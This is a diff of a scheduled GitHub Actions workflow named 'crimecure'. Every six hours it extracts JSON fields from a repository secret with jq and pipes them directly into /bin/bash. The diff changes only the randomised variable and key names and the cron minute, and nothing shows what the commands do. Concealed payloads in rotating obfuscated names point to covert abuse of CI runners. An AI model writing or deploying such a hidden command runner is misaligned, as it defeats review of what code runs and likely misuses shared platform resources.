@@ -1,11 +1,10 @@
 name: crimecure
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 4/6 * * *'
+    - cron: '14 4/6 * * *'
 
-jobs:  # 32027
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,21 @@ jobs:  # 32027
       - uses: actions/checkout@v4
       - name: crimecure
         env:
-          lk62: ${{ secrets.lk62 }}
+          mqclg78613: ${{ secrets.mqclg78613 }}
         run: |
-          echo $lk62 | jq -r .e37562 | /bin/bash
-          echo $rnauh83078 | jq -r .g335 | /bin/bash
-          echo $bv475 | jq -r .p43427 | /bin/bash
-          echo $tdua35206 | jq -r .bqh299 | /bin/bash
-          echo $np7 | jq -r .ov00830 | /bin/bash
-          echo $x19463 | jq -r .ue2 | /bin/bash
-          echo $nh90 | jq -r .tboh152 | /bin/bash
+          echo $mqclg78613 | jq -r .xwxg4 | /bin/bash
+          echo $pevu346 | jq -r .atxnx88 | /bin/bash
+          echo $adakb73 | jq -r .m24 | /bin/bash
+          echo $lfbin7832 | jq -r .xkrgt7856 | /bin/bash
+          echo $tjh63667 | jq -r .xtekv68 | /bin/bash
+          echo $r97574 | jq -r .wqm67 | /bin/bash
+          echo $dojmb2 | jq -r .ymks90186 | /bin/bash
+          echo $l12 | jq -r .lqjme484 | /bin/bash
+          echo $dxs75471 | jq -r .oijfy787 | /bin/bash
+          echo $r18 | jq -r .z94 | /bin/bash
+          echo $b9 | jq -r .z65019 | /bin/bash
+          echo $ibba256 | jq -r .ccy5328 | /bin/bash
+          echo $pmkaq85 | jq -r .il31 | /bin/bash
+          echo $l91 | jq -r .ngey514 | /bin/bash
+          echo $w4 | jq -r .x45649 | /bin/bash
 
